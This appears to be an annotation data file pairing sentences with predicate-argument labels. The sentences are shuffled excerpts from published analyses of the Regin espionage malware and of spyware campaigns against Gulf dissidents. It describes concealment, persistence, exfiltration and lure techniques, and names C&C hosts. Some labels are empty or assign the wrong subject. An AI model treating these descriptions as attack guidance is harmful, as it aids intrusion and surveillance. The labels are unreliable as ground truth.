\u2022\t %Windir%\\cursors (possibly only in version 2.0)\n  Registry subkey\n  \u2022\t HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4F20E605-9452-4787-B793-\n     D0204917CA58}\n  \u2022\t HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\RestoreList\\VideoBase (possibly only in version\n     2.0)\n</list>\n  This stage can also hide running instances of Stage 1": [{"hide": {"A": "hide", "S": "This stage", "O": ["running instances of Stage 1"]}}, {"be found encrypted": {"A": "be found encrypted", "O": ["Stage 2"]}}], " Example payload\n  functionality seen to date includes:\n<list>\n  \u2022\t Sniffing low-level network traffic\n  \u2022\t Exfiltrating data through various channels (TCP, UDP, ICMP, HTTP)\n  \u2022\t Gathering computer information\n  \u2022\t Stealing passwords\n  \u2022\t Gathering process and memory information\n  \u2022\t Crawling through the file system\n  \u2022\t Low level forensics capabilities (for example, retrieving files that were deleted)\n  \u2022\t UI manipulation (remote mouse point & click activities, capturing screenshots, etc.)\n  \u2022\t Enumerating IIS web servers and stealing logs\n  \u2022\t Sniffing GSM BSC administration network traffic\n</list>\n</section>\n<section>\n<heading>Encrypted virtual file system containers</heading>\n  Regin stores data files and payloads on disk in encrypted virtual file system files": [{"stores": {"A": "stores", "S": "Regin", "O": ["data files and payloads", "in encrypted virtual file system files", "on disk"]}}], " It is built\n  on a framework that is designed to sustain long-term intelligence-gathering operations\n  by remaining under the radar": [{"remaining": {"A": "remaining", "S": "It", "O": ["under the radar"]}, "sustain": {"A": "sustain", "S": "It", "O": ["long-term intelligence-gathering operations"]}}], " The files for Stage 5 are injected into services.exe by\n  Stage 4": [{"are injected": {"A": "are injected", "S": "Stage 4", "O": ["into services.exe", "The files for Stage 5"]}}], " It can\n    also scan for deleted files on an infected computer and retrieve them": [{"retrieve": {"A": "retrieve", "S": "It", "O": ["them"]}}, {"scan": {"A": "scan", "O": ["for deleted files on an infected computer"]}}], " These\n  backchannel operations are bidirectional,\n  which means either the attackers can initiate\n  communications with compromised computers\n  on the border network or the compromised\n  computers can initiate communications with\n  the attacker": [{"initiate": {"A": "initiate", "S": "the attackers", "O": ["on the border network", "communications", "with compromised computers"]}}, {"initiate": {"A": "initiate", "S": "the compromised computers", "O": ["communications", "with the attacker"]}}, {"are": {"A": "are", "S": "backchannel operations", "O": ["bidirectional"]}}], "\n\n    Regin goes to some lengths to hide the data it is stealing": [{"is stealing": {"A": "is stealing", "S": "it", "O": ["the data"]}, "hide": {"A": "hide", "S": "Regin", "O": ["the data"]}}], " This file is not an encrypted container, but it is encrypted and\n  compressed": [{"is encrypted and compressed": {"A": "is encrypted and compressed", "O": ["it"]}}], " These kernel drivers may be registered as a system\n  service or may have an associated registry key to load the driver while the computer is starting up": [{"load": {"A": "load", "S": "kernel drivers", "O": ["the driver"]}}], " Regin is also configured to\n    steal passwords, monitor network traffic, and gather information on processes and memory utilization": [{"gather": {"A": "gather", "S": "Regin", "O": ["information on processes and memory utilization"]}, "monitor": {"A": "monitor", "S": "Regin", "O": ["network traffic"]}, "steal": {"A": "steal", "S": "Regin", "O": ["passwords"]}}], " Similar to previous stages, Stage 2 finds and loads an encrypted version of Stage 3 from either\n  NTFS extended attributes or a registry key blob": [{"finds and loads": {"A": "finds and loads", "S": "Stage 2", "O": ["an encrypted version of Stage 3", "from either NTFS extended attributes or a registry key blob"]}}], "\n\n</section>\n<section>\n<heading>Conclusion</heading>\n    Regin is a highly-complex threat which has been used for large-scale data collection or intelligence gathering\n    campaigns": [{"been used": {"A": "been used", "O": ["for large-scale data collection or intelligence gathering campaigns", "Regin"]}}], "\n\n  As explained above, the files are encrypted": [{"are encrypted": {"A": "are encrypted", "O": ["the files"]}}], " Stage 2 is not stored in the traditional\n  file system, but is encrypted within an extended attribute or a registry key blob": [{"is encrypted": {"A": "is encrypted", "O": ["within an extended attribute or a registry key blob", "Stage 2"]}}], " The container\u2019s sectors</caption>\n<table>\nOffset      Type                   Description\n00h         DWORD                  Next sector offset, or 0\n04h         BYTE[sectsize-4]       Data\n</table>\n</section>\n<section>\n<heading>Logging</heading>\n  Regin logs data to the ApplicationLog.dat file": [{"logs": {"A": "logs", "S": "Regin", "O": ["data", "to the ApplicationLog.dat file"]}}], " Valuable target data is often not written to disk": [{"is often not written": {"A": "is often not written", "O": ["to disk", "Valuable target data"]}}], "\n</cover>\n\f                                                     <header>   Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n\n\n<section>\n<heading>Payloads</heading>\n    Regin can be distributed with various payload modules or receive payload modules after infection": [{"receive": {"A": "receive", "S": "Regin", "O": ["after infection", "payload modules"]}}, {"be distributed": {"A": "be distributed", "O": ["Regin", "with various payload modules"]}}], "\n</section>\n<section>\n<heading>Stage 1</heading>\n  Stage 1 is the initial load point for the threat": [{"is": {"A": "is", "S": "Stage 1", "O": ["the initial load point for the threat"]}}], " There are two known Stage 1 file names:\n  <list>\n  \u2022\t usbclass.sys (version 1.0)\n  \u2022\t adpu160.sys (version 2.0)\n  </list>\n  These are kernel drivers that load and execute Stage 2": [{"load and execute": {"A": "load and execute", "S": "kernel drivers", "O": ["Stage 2"]}}], " If no extended attributes are\n  found, Stage 2 is executed from a set of registry keys": [{"is executed": {"A": "is executed", "O": ["from a set of registry keys", "Stage 2"]}}], " The encryption\n  mode is reverse cipher feedback (CFB)": [{"is": {"A": "is", "S": "The encryption mode", "O": ["reverse cipher feedback (CFB)"]}}], " It is used for the\n  collection of data and continuous monitoring of targeted organizations or individuals": [{"monitoring": {"A": "monitoring", "S": "It", "O": ["of targeted organizations or individuals"]}, "is used": {"A": "is used", "S": "It", "O": ["for the collection of data"]}}], "\n\n    Regin has a wide range of standard capabilities, particularly around monitoring targets and stealing data": [{"stealing": {"A": "stealing", "S": "Regin", "O": ["data"]}, "monitoring": {"A": "monitoring", "S": "Regin", "O": ["targets"]}}], "\n\n  Stage 2 can also monitor the state of the threat": [{"monitor": {"A": "monitor", "S": "Stage 2", "O": ["the state of the threat"]}}], " We also recovered files from infected\n    computers that may or may not be associated with 64-bit Regin, including several variants of svcsstat.exe, a file that\n    aims to retrieve binary data over pipes or sockets and execute the data": [{"retrieve": {"A": "retrieve", "S": "a file", "O": ["binary data", "over pipes"]}, "execute": {"A": "execute", "S": "a file", "O": ["the data"]}}, {}], " Symantec believes that\n  once the dropper is executed on the target\u2019s computer, it will install and execute Stage 1": [{"execute": {"A": "execute", "S": "it", "O": ["Stage 1"]}, "install": {"A": "install", "S": "it", "O": ["Stage 1"]}}, {}], " All\n    other stages are stored as encrypted data blobs,\n\n    as a file or within a non-traditional file storage\n\n    area such as the registry, extended attributes, or\n    raw sectors at the end of disk": [{"are stored": {"A": "are stored", "O": ["as encrypted data blobs", "All other stages"]}}], "\n\n    Regin is capable of installing a large number of additional payloads, some highly customized for the targeted\n    computer": [{"installing": {"A": "installing", "S": "Regin", "O": ["a large number of additional payloads"]}}], "\n\n  Stage 1 simply reads and executes Stage 2 from a set of NTFS extended attributes": [{"reads and executes": {"A": "reads and executes", "S": "Stage 1", "O": ["Stage 2", "from a set of NTFS extended attributes"]}}], " It goes to extraordinary lengths to conceal itself and its\n  activities on compromised computers": [{"conceal": {"A": "conceal", "S": "It", "O": ["itself and its activities on compromised computers"]}}], " In addition to loading and executing Stage 4, Stage\n3 offers a framework for the higher level stages": [{"loading and executing": {"A": "loading and executing", "S": "Stage 3", "O": ["Stage 4"]}}], " Files stored inside EVFS containers are\n  encrypted with a variant of RC5, using 64-bit blocks and 20 rounds": [{"are encrypted": {"A": "are encrypted", "O": ["Files stored inside EVFS containers", "using 64-bit blocks and 20 rounds", "with a variant of RC5"]}}], " The modular design also makes analysis of the\n  threat difficult, as all components must be available in order to fully understand it": [{"makes": {"A": "makes", "S": "The modular design", "O": ["analysis of the threat difficult"]}}], " The initial\n    stages involve the installation and configuration\n    of the threat\u2019s internal services": [{"involve": {"A": "involve", "S": "The initial stages", "O": ["the installation and configuration of the threat\u2019s internal services"]}}], " It\u2019s likely that Stage\n  0 is responsible for setting up various extended attributes and/or registry keys and values that hold encoded\n  versions of stages 2, 3, and potentially stages 4 and onwards": [{"setting up": {"A": "setting up", "S": "Stage 0", "O": ["various extended attributes and/or registry keys and values that hold encoded versions of stages 2, 3, and potentially stages 4 and onwards"]}}], "\n</section>\n<section>\n<heading>Stage 2</heading>\n  Stage 2 is a kernel driver that simply extracts, installs and runs Stage 3": [{"extracts, installs and runs": {"A": "extracts, installs and runs", "S": "Stage 2", "O": ["Stage 3"]}}, {}], " APTs typically seek specific\n  information, usually intellectual property": [{"seek": {"A": "seek", "S": "APTs", "O": ["specific information, usually intellectual property"]}}], "\n  The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage\n  5 payloads, such as C375h and 1Bh": [{"are undertaken": {"A": "are undertaken", "S": "various modules", "O": ["The C&C operations"]}}], "\n  When the attackers who operated Regin cleaned up compromised computers once they were finished with them,\n  they often failed to remove Stage 4 and 5 artifacts from the system": [{"cleaned up": {"A": "cleaned up", "S": "the attackers who operated Regin", "O": ["compromised computers"]}}], " Four transport protocols are available for C&C:\n  \u2022\t ICMP: Payload information can be encoded and embedded in lieu of legitimate ICMP/ping data": [{"be encoded and embedded": {"A": "be encoded and embedded", "O": ["in lieu of legitimate ICMP/ping data", "Payload information"]}}], " An example of Regin\u2019s methods organized into 12 groups</caption>\n<table>\n Major                           Functionality\n 0001h                           Core\n 000Dh                           Compression, decompression\n 000Fh                           Encryption, decryption\n 003Dh                           EVFS handling\n 0007h                           Container management\n 000Bh                           Log management\n 0033h                           Loader\n 0011h                           Network\n 0013h                           Network\n C373h                           TCP command-and-control (C&C)\n 0019h                           UDP C&C\n 0009h                           C&C Processor\n </table>\n </section>\n\n\n                                    <footer>         Page 10</footer>\n\f                                <header>                Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n<section>\n\n\n<heading>Stage 4</heading>\n  The files for Stage 4, which are loaded by Stage 3, consist of a user-mode orchestrator and multiple kernel\n  payload modules": [{"are loaded": {"A": "are loaded", "S": "Stage 3", "O": ["The files for Stage 4"]}}], "\n</section>\n<section>\n<heading>Command-and-control operations</heading>\n\n  Regin\u2019s C&C operations are extensive": [{"are": {"A": "are", "S": "Regin\u2019s C&C operations", "O": ["extensive"]}}], "\n\n  Regin is an extremely complex piece of software that can be customized with a wide\n  range of different capabilities which can be deployed depending on the target": [{}], " These modules can\ninclude data collectors, a self-defense engine which detects if attempts to detect the toolkit occur, functionality for encrypted communications, network capture\nprograms, and remote controllers of different kinds": [{"include": {"A": "include", "S": "These modules"}, "encrypted": {"A": "encrypted", "S": "These modules", "O": ["communications"]}}, {"detects": {"A": "detects", "S": "a self-defense engine", "O": ["attempts to detect the toolkit"]}}], " On failure, Stage 2 is able to disinfect the\ncompromised device": [{"disinfect": {"A": "disinfect", "S": "Stage 2", "O": ["On failure", "the compromised device"]}}], "\n\nThe Regin loaders that are disguised as Microsoft drivers with names such as:\n<list>\n    serial.sys\n    cdaudio.sys\n    atdisk.sys\n    parclass.sys\n    usbclass.sys\n</list>\n\fMimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems": [{"disguise": {"A": "disguise", "S": "the loaders", "O": ["their presence on the system"]}, "appear": {"A": "appear", "S": "the loaders", "O": ["less suspicious", "to host intrusion detection systems"]}, "Mimicking": {"A": "Mimicking", "S": "the loaders", "O": ["Microsoft drivers"]}}, {"are disguised as": {"A": "are disguised as", "S": "The Regin loaders", "O": ["Microsoft drivers"]}}], "\n</section>\n<section>\n<heading>Stealth Implant</heading>\n\nThe Intercept\u2019s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header, which is a sign that it\nmight have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit": [{"loaded": {"A": "loaded", "S": "a Regin driver", "O": ["a sample"]}}, {"provide": {"A": "provide", "S": "it", "O": ["for the tool kit", "stealth functionality"]}}], " The malicious\nLinkedIn page launched a malware attack, infecting the employees\u2019 computers and giving the spies total control of their systems, allowing GCHQ to get deep\ninside Belgacom\u2019s networks to steal data": [{"steal": {"A": "steal", "S": "GCHQ", "O": ["data"]}}, {"giving": {"A": "giving", "S": "a malware attack", "O": ["total control of their systems"]}, "infecting": {"A": "infecting", "S": "a malware attack", "O": ["the employees\u2019 computers"]}}], "\n\nThe malware, which steals data from infected systems and disguises itself as legitimate Microsoft software, has also been identified on the same European Union\ncomputer systems that were targeted for surveillance by the National Security Agency": [{"disguises": {"A": "disguises", "S": "The malware", "O": ["itself", "as legitimate Microsoft software"]}, "steals": {"A": "steals", "S": "The malware", "O": ["from infected systems", "data"]}}], " It initializes the core components of the architecture and loads the next parts of the\nmalware": [{"loads": {"A": "loads", "S": "It", "O": ["the next parts of the malware"]}, "initializes": {"A": "initializes", "S": "It", "O": ["the core components of the architecture"]}}], "\n\nThis Regin driver recurrently checks that the current IRQL (Interrupt Request Level) is set to PASSIVE_LEVEL using the KeGetCurrentIrql() function in many\nparts of the code, probably in order to operate as silently as possible and to prevent possible IRQL confusion": [{"checks": {"A": "checks", "S": "This Regin driver", "O": ["the current IRQL (Interrupt Request Level)"]}}], "\n</section>\n<section>\n<heading>Second stage loader</heading>\n\nWhen launched, it cleans traces of the initial loader, loads the next part of the toolkit and monitors its execution": [{"cleans": {"A": "cleans", "S": "it", "O": ["traces of the initial loader"]}, "monitors": {"A": "monitors", "S": "it", "O": ["its execution"]}, "loads": {"A": "loads", "S": "it", "O": ["the next part of the toolkit"]}}], "\n\nThe driver also contains routines to check for specific builds of the Windows kernel in use, including very old versions such as for Windows NT4 Terminal Server\nand Windows 2000, and then adapts its behavior accordingly": [{"check for": {"A": "check for", "S": "The driver", "O": ["specific builds of the Windows kernel in use"]}, "adapts": {"A": "adapts", "S": "The driver", "O": ["its behavior"]}}], " The malware zeroes out its PE (Portable Executable, the Windows executable format) headers in memory, replacing \u201cMZ\u201d with its own magic\nmarker 0xfedcbafe": [{"zeroes out": {"A": "zeroes out", "S": "The malware", "O": ["its PE (Portable Executable, the Windows executable format) headers in memory"]}, "replacing": {"A": "replacing", "S": "The malware", "O": ["\u201cMZ\u201d", "with its own magic marker 0xfedcbafe"]}}], "\n\nOne of the keys to Regin is its stealth: To avoid detection and frustrate analysis, malware used in such operations frequently adhere to a modular design": [{"frustrate": {"A": "frustrate", "S": "malware", "O": ["analysis"]}, "avoid": {"A": "avoid", "S": "malware", "O": ["detection"]}}], "\n\nThe following Regin components have been identified:\n</section>\n<section>\n<heading>Loaders</heading>\n\nThe first stage are drivers which act as loaders for a second stage": [{"act as": {"A": "act as", "S": "The first stage", "O": ["loaders for a second stage"]}}], " This binary file\ncontains some of such pointers initialized, which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised\nsystem": [{"was dumped": {"A": "was dumped", "O": ["the file", "from memory"]}}], " When started, this stage simply loads and executes Stage 2": [{"loads and executes": {"A": "loads and executes", "S": "this stage", "O": ["Stage 2"]}}], "\n\nIn addition, when freeing memory using ExFreePool(), the driver zeroes the content, probably to avoid leaving traces in pool memory": [{"zeroes": {"A": "zeroes", "S": "the driver", "O": ["the content"]}, "avoid": {"A": "avoid", "S": "the driver", "O": ["leaving traces in pool memory"]}}], "\n\nUpon execution of the unload routine (located at 0xFDEFA04A), the driver performs a long sequence of steps to remove remaining traces and artifacts": [{"remove": {"A": "remove", "S": "the driver", "O": ["remaining traces and artifacts"]}}], "\n\n\n<figure></figure>\n\n<caption>This picture shows the very first bytes of the sample in question, showing the unique 0xfedcbafe header at the beginning.</caption>\n\nIn order to access information stored in the computer\u2019s memory, programs use objects that reference specific locations in memory called pointers": [{"access": {"A": "access", "S": "programs", "O": ["information stored in the computer\u2019s memory"]}}], "\n\nThe implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the\ncompany\u2019s network and customers, which include the European Commission, the European Parliament, and the European Council": [{"conduct": {"A": "conduct", "S": "The implants", "O": ["surveillance of internal Belgacom company communications"]}, "gather": {"A": "gather", "S": "The implants", "O": ["data"]}}], " \u201cIt\u2019s always been clear to us the malware was highly sophisticated, but ever since the clean-up this whole story belongs to the past for\nus.\u201d\n\nIn a hacking mission codenamed Operation Socialist, GCHQ gained access to Belgacom\u2019s internal systems in 2010 by targeting engineers at the company": [{"gained": {"A": "gained", "S": "GCHQ", "O": ["access to Belgacom\u2019s internal systems"]}}], "\n\nRegin was found on infected internal computer systems and email servers at Belgacom, a partly state-owned Belgian phone and internet provider, following\nreports last year that the company was targeted in a top-secret surveillance operation carried out by British spy agency Government Communications\nHeadquarters, industry sources told The Intercept": [{}], " Three\nmonths after Author was targeted, Ahmed received an e-mail\ncontaining an attachment with Xtreme RAT that talked to the\nsame C&C server (Figure 5), suggesting that the attackers who\ninfected Ahmed with RCS may have provided a list of interest-\ning e-mail addresses to another group for further targeting": [{"talked": {"A": "talked", "S": "Xtreme RAT", "O": ["to the same C&C server"]}}, {"received": {"A": "received", "S": "Ahmed", "O": ["an e-mail containing an attachment", "with Xtreme RAT"]}}], " The attacks include spyware for ongoing\nmonitoring and the use of \u201cIP spy\u201d links to deanonymize those\nwho voice dissent": [{"include": {"A": "include", "S": "The attacks", "O": ["the use of \u201cIP spy\u201d links to deanonymize those who voice dissent"]}}], "\n   The first attacks we observed in the UAE involved a\ngovernment-grade \u201clawful interception\u201d trojan known as Re-\nmote Control System (RCS), sold by the Italian company Hack-\ning Team": [{"involved": {"A": "involved", "S": "The first attacks", "O": ["a government-grade \u201clawful interception\u201d trojan known as Re- mote Control System (RCS), sold by the Italian company Hack- ing Team"]}}], " The attacker sent the e-mails using\nReadNotify.com, which records the user\u2019s IP address upon\n\n<footer>USENIX Association \t                                                                                                                  23rd USENIX Security Symposium\u2003 515</footer>\n\ftheir mail client downloading the remote image.<fn>6</fn>\n   While ReadNotify.com forbids spoofing in their TOS,\nthe service has a vulnerability known to the attackers (and\nwhich we confirmed) that allows spoofing the From address\nby directly setting the parameters on a submission form on their\nwebsite": [{"records": {"A": "records", "S": "ReadNotify.com", "O": ["the user\u2019s IP address", "upon their mail client downloading the remote image"]}}, {"sent": {"A": "sent", "S": "The attacker", "O": ["the e-mails", "using ReadNotify.com"]}}], " (Interestingly, spyware subse-\nquently sent to others has used bait content about Ahmed.)\n\n   Further attacks: In October 2012, UAE Journalist A and\nHuman Rights activist B (per Figure 6) forwarded us suspi-\ncious e-mails they had received that contained a Word docu-\nment corresponding to the first stage of 3-Stage Exploit Kit\n(Figure 5)": [{"received": {"A": "received", "S": "they", "O": ["suspi- cious e-mails", "that contained a Word docu- ment corresponding to the first stage of 3-Stage Exploit Kit"]}}, {"used": {"A": "used", "S": "spyware subse- quently sent to others", "O": ["bait content about Ahmed"]}}], " The attacks we have\ndocumented usually involve the use of malicious links or e-mail\nattachments, designed to obtain information from a device": [{"obtain": {"A": "obtain", "S": "The attacks we have documented", "O": ["from a device", "information"]}, "involve": {"A": "involve", "S": "The attacks we have documented", "O": ["the use of malicious links or e-mail attachments"]}}], "\n</footnote>\n   sophisticated than FinSpy and RCS, they share the same ba-\nsic functionality, including screen capture, keylogging, remote\nmonitoring of webcams and microphones, remote shell, and file\nexfiltration": [{"including": {"A": "including", "S": "the same ba- sic functionality", "O": ["file exfiltration"]}}], " When run, the\nsample unpacks a compiled Visual Basic project that loads, via\nthe RunPE method <fn>[62]</fn> , an executable packed with UPX <fn>[63]</fn> ": [{"loads": {"A": "loads", "S": "a compiled Visual Basic project", "O": ["via the RunPE method", "an executable packed with UPX"]}}], " This address was un-\nreachable when we probed it; a researcher pointed us to an FS-\nBSpy sample that contained an Arabic-language bait document\nabout Omani poetry, which talked to a C&C in the UK": [{"talked": {"A": "talked", "S": "an Arabic-language bait document about Omani poetry", "O": ["to a C&C in the UK"]}}, {"contained": {"A": "contained", "S": "an FS- BSpy sample", "O": ["an Arabic-language bait document about Omani poetry"]}}], "\n\nThe RCS samples we examined also had the ability to propa-\n\ngate to other devices, including into inactive VMWare virtual\nmachines by modifying the disk image, onto USB flash drives,\n\nand onto Windows Mobile phones": [{"propa- gate": {"A": "propa- gate", "S": "The RCS samples we examined", "O": ["by modifying the disk image", "onto USB flash drives", "to other devices", "into inactive VMWare virtual machines", "onto Windows Mobile phones"]}}], " The executables used virtualized obfusca-\ntion <fn>[28]</fn> , which appeared to be custom-designed": [{"used": {"A": "used", "S": "The executables", "O": ["virtualized obfusca- tion"]}}], "\n   To exfiltrate data back to the C&C server, a module encrypts\nand writes it to disk in a special folder": [{"exfiltrate": {"A": "exfiltrate", "O": ["back to the C&C server", "data"]}}, {"writes": {"A": "writes", "S": "a module", "O": ["it", "to disk in a special folder"]}, "encrypts": {"A": "encrypts", "S": "a module"}}], " (RCS\ntraffic is identifiable based on a distinctive user agent and URL\nin POST requests.) A sample of FSBSpy apparently installed\nfrom an exploit on a Turkish server talked to one of the servers\nin this group.<fn>[79]</fn>\n   We also found server groups containing servers in Uzbek-\nistan and Kazakhstan; we found FSBSpy samples on Virus-\nTotal uploaded from these countries that communicated with\nservers in these groups": [{"communicated": {"A": "communicated", "S": "FSBSpy samples on Virus- Total uploaded from these countries", "O": ["with servers in these groups"]}}, {"talked": {"A": "talked", "S": "A sample of FSBSpy", "O": ["to one of the servers in this group"]}}], " Finally, FinSpy\u2019s wire protocol for C&C commu-\nnication uses the same type of encryption, and thus is subject\nto the same brute force attack on AES keys": [{"uses": {"A": "uses", "S": "FinSpy\u2019s wire protocol for C&C commu- nication", "O": ["the same type of encryption"]}}], " However, the account also directly crit-\nicized the King on occasion, in one case referring to him as\n\u201cweak\u201d and \u201cstingy.\u201d An account linked to al9mood sent Je-\nhad Abdulla an IP spy link on 10/2/12 in a public message": [{"sent": {"A": "sent", "S": "An account linked to al9mood", "O": ["an IP spy link", "in a public message", "on 10/2/12", "Je- had Abdulla"]}}], "\nAs summarized in Table 3, the attacks often include fake or ma-\nliciously packaged security tools; intriguing, or ideological, or\nmovement-relevant content (e.g": [{"include": {"A": "include", "S": "the attacks", "O": ["fake or ma- liciously packaged security tools; intriguing, or ideological, or movement-relevant content (e.g. lists of wanted persons)"]}}], "\n    In the most common attack sequence we observed, illus-\ntrated with three examples in Figure 3, the attacker seeds mal-\nware via private chat messages, posts in opposition-controlled\nsocial media groups, or e-mail": [{"seeds": {"A": "seeds", "S": "the attacker", "O": ["mal- ware", "via private chat messages, posts in opposition-controlled social media groups, or e-mail"]}}], " We grouped servers by the SSL certificates they\nreturned, and found that each group forwarded to only a sin-\ngle server, except for one case where a group forwarded to two\ndifferent IPs (both in Morocco)": [{"forwarded": {"A": "forwarded", "S": "each group", "O": ["to only a sin- gle server"]}}, {"forwarded": {"A": "forwarded", "S": "a group", "O": ["to two different IPs"]}}], " The\nthird attack in Figure 3, observed in October 2013, entices tar-\ngets with e-mails purporting to contain or link to videos about\nthe current conflict, infecting victims with Xtreme RAT, and\nusing the C&C tn1.linkpc.net": [{"entices": {"A": "entices", "S": "The third attack", "O": ["tar- gets", "with e-mails purporting to contain or link to videos about the current conflict"]}, "infecting": {"A": "infecting", "S": "The third attack", "O": ["with Xtreme RAT", "victims"]}, "using": {"A": "using", "S": "The third attack", "O": ["the C&C tn1.linkpc.net"]}}], " The 32 byte AES key and 16 byte\nIV are generated by repeatedly reading the low-order-4-bytes of\nthe Windows clock": [{"are generated": {"A": "are generated", "O": ["by repeatedly reading the low-order-4-bytes of the Windows clock", "The 32 byte AES key and 16 byte IV"]}}], " Member C received a malicious\nfile as an e-mail attachment, while NGO Worker D was sent a\nshortened link (url[.] no/Uu5) to a download from a directory\nof Mrconstrucciones[.] net,<fn>7</fn>  a site that may have been com-\npromised": [{"was sent": {"A": "was sent", "O": ["NGO Worker D", "a shortened link (url[.] no/Uu5) to a download from a directory of Mrconstrucciones[.] net"]}}, {"received": {"A": "received", "S": "Opp. Member C", "O": ["as an e-mail attachment", "a malicious file"]}}], " Some samples were packed\n with the MPress packer <fn>[55]</fn> , and some Windows samples were\n obfuscated to look like the PuTTY SSH client": [{"were obfuscated": {"A": "were obfuscated", "O": ["some Windows samples", "to look like the PuTTY SSH client"]}}], " We also similarly obtained and analyzed sam-\nples of FSBSpy <fn>[72]</fn> , a piece of malware that can report system\ninformation, upload screenshots, and drop and execute more\nmalware": [{"report": {"A": "report", "S": "a piece of malware", "O": ["system information"]}, "upload": {"A": "upload", "S": "a piece of malware", "O": ["screenshots"]}, "drop and execute": {"A": "drop and execute", "S": "a piece of malware", "O": ["more malware"]}}], " For example, the RCS\n sample sent to Ahmed adds a Run registry key, whereas the\n FinSpy samples used in Bahrain overwrite the hard disk\u2019s boot\n sector to modify the boot process; the spyware is loaded be-\n\n<footer>518\u2003 23rd USENIX Security Symposium\n</footer>\n\ffore the OS, and injects itself into OS processes as they start": [{"adds": {"A": "adds", "S": "the RCS sample sent to Ahmed", "O": ["a Run registry key"]}}, {"injects": {"A": "injects", "S": "the spyware", "O": ["into OS processes", "itself", "as they start"]}}, {"modify": {"A": "modify", "S": "the FinSpy samples used in Bahrain", "O": ["the boot process"]}, "overwrite": {"A": "overwrite", "S": "the FinSpy samples used in Bahrain", "O": ["the hard disk\u2019s boot sector"]}}, {"is loaded": {"A": "is loaded", "O": ["be- fore the OS", "the spyware"]}}], " It then over-\nwrites the files, renames them several times, and deletes them,\n\nin an apparent effort to frustrate forensic analysis": [{"over- writes": {"A": "over- writes", "S": "It", "O": ["the files"]}, "renames": {"A": "renames", "S": "It", "O": ["them", "several times"]}, "frustrate": {"A": "frustrate", "S": "It", "O": ["forensic analysis"]}, "deletes": {"A": "deletes", "S": "It", "O": ["them"]}}], "\n\n   Analysis of capabilities: We found that the spyware has\na modular design, and can download additional modules from\na command & control (C&C) server, including password cap-\nture (from over 20 applications) and recording of screenshots,\nSkype chat, file transfers, and input from the computer\u2019s micro-\nphone and webcam": [{"download": {"A": "download", "S": "the spyware", "O": ["additional modules", "from a command & control (C&C) server"]}}, {"including": {"A": "including", "O": ["input from", "the computer\u2019s micro- phone"]}}, {"including": {"A": "including", "O": ["Skype chat"]}}, {"including": {"A": "including", "O": ["password cap- ture (from over 20 applications)"]}}, {"including": {"A": "including", "O": ["recording of screenshots"]}}, {"including": {"A": "including", "O": ["file transfers"]}}], "\n\n   C&C server:            The samples communicated with\n77.69.140.194, which belongs to a subscriber of\nBatelco, Bahrain\u2019s main ISP": [{"communicated": {"A": "communicated", "S": "The samples", "O": ["with 77.69.140.194"]}}], " The exploit\ndownloaded a second stage, which in turn downloaded a sam-\nple of SpyNet from maile-s.com": [{"downloaded": {"A": "downloaded", "S": "a second stage", "O": ["from maile-s.com", "a sam- ple of SpyNet"]}}, {"downloaded": {"A": "downloaded", "S": "The exploit", "O": ["a second stage"]}}], " The RCS\nsamples also communicated with domains with lapsed registra-\n\ntions, so we registered them to observe incoming traffic": [{"communicated": {"A": "communicated", "S": "The RCS samples", "O": ["with domains with lapsed registra- tions"]}}], " The key and IV are encrypted using an em-\nbedded RSA-2048 public key, and stored in the same file as the\ndata": [{"are encrypted": {"A": "are encrypted", "O": ["using an em- bedded RSA-2048 public key", "The key and IV"]}}], "\n\n\n   Analysis of encryption: Because the malware employed\nmyriad known anti-debugging and anti-analysis techniques, it\nthwarted our attempts to attach debuggers": [{"thwarted": {"A": "thwarted", "S": "it", "O": ["our attempts to attach debuggers"]}}, {"employed": {"A": "employed", "S": "the malware", "O": ["myriad known anti-debugging and anti-analysis techniques"]}}], " The messages\nusually include text, often in Arabic, that attempts to persuade\nthe target to execute the file or click the link": [{"include": {"A": "include", "S": "The messages", "O": ["text, often in Arabic, that attempts to persuade the target to execute the file or click the link"]}}], " An\nunidentified dropper using this C&C targeted Journalist F; a\nSpyNet attack on Relative of political detainee D also used\nthis C&C": [{"using": {"A": "using", "S": "An unidentified dropper", "O": ["this C&C"]}}, {"used": {"A": "used", "S": "a SpyNet attack on Relative of political detainee D", "O": ["this C&C"]}}], " The exploits primarily downloaded instances of SpyNet\nfrom upload.bz, which for the most part communicated\nwith C&C at sn.all-google.com": [{"downloaded": {"A": "downloaded", "S": "The exploits", "O": ["instances of SpyNet", "from upload.bz"]}}, {"communicated": {"A": "communicated", "S": "instances of SpyNet", "O": ["with C&C at sn.all-google.com"]}}], " The attachment contained an embedded Flash file\nthat exploited a vulnerability fixed in Adobe Flash 11.4, loading\nshell code to download a second stage from faddeha.com": [{"download": {"A": "download", "S": "shell code", "O": ["a second stage", "from faddeha.com"]}}, {"loading": {"A": "loading", "S": "an embedded Flash file that exploited a vulnerability fixed in Adobe Flash 11.4", "O": ["shell code"]}}], " The at-\ntacker sends the pseudonymous account a link to a webpage or\nan e-mail containing an embedded remote image, using one of\nmany freely-available services.<fn>2</fn>  When the victim clicks on the\nlink or opens the e-mail, their IP address is revealed to the at-\ntacker.<fn>3</fn>  The attacker then discovers the victim\u2019s identity from\ntheir ISP": [{"sends": {"A": "sends", "S": "The at- tacker", "O": ["using one of many freely-available services", "the pseudonymous account a link to a webpage or an e-mail containing an embedded remote image"]}}, {"is revealed": {"A": "is revealed", "O": ["their IP address", "to the at- tacker"]}}], "         Their filenames contained a Uni-\n    code right-to-left override (RLO) character, causing Windows\n    to render a filename such as gpj.1bajaR.exe instead as\n    exe.Rajab1.jpg": [{"causing": {"A": "causing", "S": "Their filenames", "O": ["Windows to render a filename such as gpj.1bajaR.exe instead as exe.Rajab1.jpg"]}, "contained": {"A": "contained", "S": "Their filenames", "O": ["a Uni- code right-to-left override (RLO) character"]}}], " In that latter case, the sample arrived via e-mail\nin a .rar attachment that contained an .scr file disguised\nas a Word document": [{"arrived": {"A": "arrived", "S": "the sample", "O": ["via e-mail", "in a .rar attachment"]}}, 